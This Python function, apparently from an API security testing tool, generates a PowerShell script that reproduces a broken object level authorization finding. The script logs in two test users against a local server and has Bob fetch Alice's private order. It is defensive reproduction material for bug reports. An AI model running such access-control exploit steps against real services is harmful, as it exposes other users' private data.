def generate_powershell_curl_script(
    finding: BugFinding,
    base_url: str = "http://127.0.0.1:8000",
) -> str:
    """Generate copy-pasteable Windows PowerShell commands reproducing the issue."""
    lines = [
        "# Windows PowerShell Reproduction Script",
        f'# Target: {finding.method} {finding.endpoint}',
        "",
        "# Step 1: Reset test database",
        f'Invoke-RestMethod -Method Post -Uri "{base_url}/admin/reset"',
        "",
        "# Step 2: Login as Alice to obtain her token",
        f'$alice = Invoke-RestMethod -Method Post -Uri "{base_url}/auth/login" '
        '-ContentType "application/json" -Body \'{"username":"alice","password":"alice123"}\'',
        "",
        "# Step 3: Create an order as Alice",
        '$headersAlice = @{ Authorization = "Bearer " + $alice.access_token }',
        f'$order = Invoke-RestMethod -Method Post -Uri "{base_url}/orders" '
        '-Headers $headersAlice -ContentType "application/json" '
        '-Body \'{"item_name":"Autonomous Drone","quantity":1,"total_price":299.99}\'',
        "",
        "# Step 4: Login as Bob to obtain Bob\'s token",
        f'$bob = Invoke-RestMethod -Method Post -Uri "{base_url}/auth/login" '
        '-ContentType "application/json" -Body \'{"username":"bob","password":"bob123"}\'',
        "",
        "# Step 5: Bob retrieves Alice\'s private order (BOLA exploit)",
        '$headersBob = @{ Authorization = "Bearer " + $bob.access_token }',
        f'Invoke-RestMethod -Method Get -Uri ("{base_url}/orders/" + $order.id) -Headers $headersBob',
    ]
    return "\n".join(lines)


